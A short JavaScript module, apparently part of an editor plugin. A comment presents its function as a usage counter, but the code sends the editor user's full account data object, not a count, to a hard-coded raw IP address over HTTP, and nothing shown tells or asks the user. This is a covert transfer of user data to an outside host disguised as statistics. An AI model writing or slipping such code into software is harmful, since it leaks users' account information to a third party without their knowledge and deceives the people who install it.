const tools = require("./tools")

module.exports = {

	// 用户使用次数统计
	countStartupTimes(){
		if(Editor.User && Editor.User.getUserData){
			Editor.User.getUserData().then((post_data)=>{
				if(!post_data) {
					return
				}
				
				tools.httpPost('120.77.174.207','/logincount',8081,post_data);
			});
		}
		
	},

}
